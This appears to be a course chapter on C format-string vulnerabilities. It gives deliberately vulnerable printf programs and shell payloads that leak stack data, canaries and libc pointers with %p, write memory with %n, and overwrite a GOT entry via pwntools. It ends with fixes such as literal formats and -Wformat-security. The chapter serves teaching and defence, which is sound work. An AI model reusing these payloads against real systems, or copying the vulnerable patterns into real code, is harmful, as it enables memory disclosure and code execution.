# Chapter 7 — Format-String Vulnerabilities (8 test cases)

> A bug that gives you **both** an arbitrary memory *read* (leak) **and** an
> arbitrary *write* from a single `printf` — one of the most powerful primitives
> when it exists.

---

## 7.1 What it is

`printf`-family functions take a **format string** that tells them how many
arguments to consume and how to interpret them. If **attacker-controlled data is
used *as* the format string**, the attacker dictates how `printf` walks memory.

```c
printf(user_input);          // BUG — user controls the format
printf("%s", user_input);    // CORRECT — user is just data
```

## 7.2 Why it happens — how varargs read arguments

`printf` is **variadic**: it has no idea how many arguments were actually passed.
It trusts the format string. For each conversion (`%x`, `%p`, `%s`, `%n`...) it
fetches the "next argument" from where the ABI says arguments live.

On **x86-64 SysV**, the first 5 variadic args after the format come from
registers **`rsi, rdx, rcx, r8, r9`**, and the 6th onward come **off the stack**.
On **x86 (32-bit)** *all* args are on the stack, directly above the saved return
address — which is why 32-bit format bugs are so clean to demonstrate.

```c
printf("%x %x %x");   // consumes 3 "arguments" that were NEVER passed:
                      // it just reads rsi, rdx, rcx -> leaks register/stack data
```

Because the format controls the *count* and *type* of reads, `%x %x %x...` walks
further and further into the stack, and `%s` treats the fetched value as a
**pointer** and dereferences it.

---

## 7.3 The two primitives

| Conversion | Effect | Primitive |
|------------|--------|-----------|
| `%x`, `%p`, `%lx` | print the next arg (a stack/register word) | **read / leak** |
| `%s` | treat next arg as `char*`, print the string there | **arbitrary read** (if you control the pointer) |
| `%n` | **write** the number of bytes printed so far to the address in the next arg | **arbitrary write** |
| `%N$x` / `%N$n` | **positional**: directly access the Nth argument | precise targeting |
| `%<width>c` / `%<width>x` | pad output to control the count printed (for `%n`) | set the value to write |

---

## 7.4 Test case 1 — leaking the stack with `%p`

```c
// f01_leak.c
#include <stdio.h>
int main(void){
    char buf[128];
    fgets(buf, sizeof buf, stdin);
    printf(buf);                      // vulnerable
}
```
```bash
gcc -g -O0 -no-pie f01_leak.c -o f01
echo 'AAAA %p %p %p %p %p %p %p %p' | ./f01
# AAAA 0x... 0x... 0x41414141... <- your "AAAA" appears among the leaked words
```
When your own `AAAA` (0x41414141) shows up at, say, the 6th `%p`, you've found
**the offset to your buffer** on the stack — essential for the write primitive.

---

## 7.5 Test case 2 — positional / direct parameter access

Instead of many `%p`, jump straight to argument N:

```bash
echo '%6$p' | ./f01        # print the 6th argument directly
echo '%7$s' | ./f01        # dereference the 7th argument as a char*  (arbitrary read)
```
`%6$p` = "give me parameter #6." This is how you leak a **specific** value — e.g.
a saved return address (→ defeat PIE), the stack canary, or a libc pointer (→
defeat ASLR). Finding "which `$N` is my buffer" turns the read into a controlled
read.

---

## 7.6 Test case 3 — leaking the canary & defeating ASLR

```c
// f03_recon.c — same vulnerable printf, richer stack
#include <stdio.h>
void vuln(void){ char buf[128]; fgets(buf,sizeof buf,stdin); printf(buf); }
int main(void){ vuln(); vuln(); }   // loop so you can leak then exploit
```
Walk the stack with `%N$lx` until you spot:
- a value like `0x...00` ending in a zero byte that moves each run → **canary**;
- a `0x7f...` pointer into libc → subtract a known offset → **libc base**
  (defeats ASLR, Chapter 13);
- a `0x55.../0x56...` pointer → **PIE base** of the program.

Format strings are the classic **info-leak half** of an exploit precisely because
they read arbitrary stack words with no crash.

---

## 7.7 Test case 4 — the `%n` write primitive

`%n` writes the **count of bytes printed so far** to the pointed-at address.

```c
// f04_write.c
#include <stdio.h>
int target = 0;
int main(void){
    char buf[128];
    printf("target @ %p\n", (void*)&target);
    fgets(buf, sizeof buf, stdin);
    printf(buf);                       // vulnerable
    printf("\ntarget = %d (0x%x)\n", target, target);
}
```
If `&target` sits at stack-arg position 6, then:
```bash
# print 42 chars, then write 42 to arg #6 (which we arrange to be &target):
printf '%.42d%6$n' 0 | ./f04     # (placing &target into the right slot shown below)
```
To write an **arbitrary value** you pad the output to that value's size with field
widths (`%<width>x`), and to write a big 64-bit address you use **`%hn`
(2 bytes)** or **`%hhn` (1 byte)** writes in pieces (writing 4 billion bytes is
impractical). pwntools' **`fmtstr_payload(offset, {addr: value})`** builds the
whole thing for you — understanding the above is how you know what it produced.

---

## 7.8 Test case 5 — arbitrary read with `%s` + a planted pointer

```
payload = <8-byte target address>  +  "%7$s"
```
Place the address you want to read in your buffer, then `%7$s` makes `printf`
fetch that 8-byte value as a `char*` and print the string there — dumping memory
at an address you chose. Great for reading secrets or confirming a leak.

---

## 7.9 Test case 6 — GOT overwrite via `%n` (classic full exploitation)

With only **Partial RELRO** (GOT writable), aim the `%n` write at a **GOT entry**
(say `printf@got` or `exit@got`) and overwrite it with the address of `system` or
a one-gadget. The next call to that libc function jumps to your target.

```
fmtstr_payload(offset, { elf.got['exit'] : libc.sym['system'] })
```
**Full RELRO** (read-only GOT) blocks this, pushing you to other writable targets
(a saved return address, `__free_hook` on old glibc, a function pointer).

---

## 7.10 Test case 7 — `syslog`/`err`/`warn` and wrappers

```c
// f07_wrappers.c
syslog(LOG_INFO, user_input);        // same bug: user_input is the format
fprintf(stderr, user_input);
err(1, user_input);
// even logging helpers:  log_printf(level, user_input);
```
The bug isn't only `printf`. **Any** function whose format argument is attacker-
controlled is vulnerable: `fprintf`, `snprintf`, `sprintf`, `vprintf`, `syslog`,
`err/warn`, and home-grown logging wrappers. Audit every variadic/format sink.

---

## 7.11 Test case 8 — the "harmless" `%s` crash (DoS from a bad format)

```c
// f08_crash.c
printf(user_input);    // input "%s%s%s%s%s" with no matching args
```
Even without a write, `%s` dereferences whatever stack words happen to be there
as pointers. A few `%s` usually hit an invalid pointer → **SIGSEGV** → easy DoS.
So a format-string bug is *at minimum* a crash, and usually far more.

---

## 7.12 Impact
- **Info leak** (stack/heap/libc pointers → defeat ASLR, PIE, canary) — reliably.
- **Arbitrary write** (`%n`) → GOT/return-address/hook overwrite → **RCE**.
- **Arbitrary read** (`%s`) → dump secrets.
- **Crash/DoS** at minimum.
A single format bug can be a *complete* exploit (leak + write in one primitive).

---

## 7.13 The fixes
1. **Never pass untrusted data as the format.** Always a **literal** format:
   `printf("%s", data)`, `fprintf(f, "%s", data)`, `syslog(LOG_INFO,"%s",data)`.
2. **Compile with format checking:**
   `-Wformat -Wformat-security -Werror=format-security` — GCC/Clang flag
   `printf(variable)` at compile time. This catches essentially all of these.
3. **`-D_FORTIFY_SOURCE=2`** restricts `%n` in writable-memory format strings in
   glibc.
4. **Static analysis / code review:** grep for `printf(`, `sprintf(`, `syslog(`
   where the first/format arg is not a string literal.

```c
// fix for every case above:
printf("%s", buf);     // buf is data, not a format
```

---

## Recap
- Format bugs arise when **user data is the format string**; `printf` then walks
  memory per the attacker's conversions (regs then stack on x86-64; all stack on
  x86).
- `%p/%x` leak, `%s` reads, **`%n` writes**; `%N$` targets a specific arg; width
  specifiers set the written value; `%hn/%hhn` write in pieces.
- Result: info leak **and** arbitrary write from one call → full RCE (GOT
  overwrite, etc.), or at least a crash.
- Fix trivially with a **literal format** + `-Wformat-security`.

Next: **[Chapter 8 — Integer bugs → memory corruption »](08-integer-bugs.md)**
